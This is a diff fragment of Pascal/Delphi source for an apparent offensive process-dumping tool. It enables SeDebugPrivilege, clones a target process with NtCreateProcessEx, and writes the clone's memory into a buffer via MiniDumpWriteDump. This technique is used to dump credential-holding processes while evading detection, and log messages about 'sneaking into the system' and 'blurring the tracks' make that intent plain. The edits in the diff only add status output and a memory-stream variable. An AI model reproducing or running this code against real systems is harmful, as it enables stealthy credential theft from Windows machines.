@@ -175,6 +175,8 @@ function dumpprocess(pid:dword):boolean;
 
 implementation
 
+
+
 var
 MiniDumpWriteDump:function (hProcess: HANDLE; ProcessId: DWORD; hFile: HANDLE; DumpType: MINIDUMP_TYPE; ExceptionParam: pointer; UserStreamParam: pointer; CallbackParam: pointer): BOOL; stdcall;
 // proto NtCreateProcessEx
@@ -275,6 +277,7 @@ var
   clone,processHandle,hfile:thandle;
   callbackInfo:MINIDUMP_CALLBACK_INFORMATION;
 lib,lib2:int64;
+msRecInfo: TMemoryStream;
 begin
 EnableDebugPriv('SeDebugPrivilege');
 log('the fox sneaks into the system!');
@@ -304,15 +307,16 @@ if processHandle<>thandle(-1) then
    writeln('[+] PID: '+inttostr(pid));
    NtCreateProcessEx:= getProcAddress(lib2,'NtCreateProcessEx');
    status := NtCreateProcessEx(@clone,PROCESS_ALL_ACCESS,nil,processHandle,0,0,0,0,0);
-   write('[+] Status: ');
-   writeln(status);
    if clone>0 then
       begin
-       writeln('[+] Memory Cloned');
+       write('[+] Memory Cloned');
+       write(' with Process PID: ');
+       writeln(clone);
       	ZeroMemory(@callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
       	callbackInfo.CallbackRoutine := minidumpCallback;
       	callbackInfo.CallbackParam := nil;
       //
+      //readln(s);
       dumpbuffer:=HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2048 * 1024 * 128);
       writeln('[+] the fox has eaten the grapes and is blurring the tracks');
       MiniDumpWriteDump:=getProcAddress(lib,'MiniDumpWriteDump');
@@ -336,5 +340,4 @@ if processHandle<>thandle(-1) then
  end;
 
 
-end.
-
+ end.
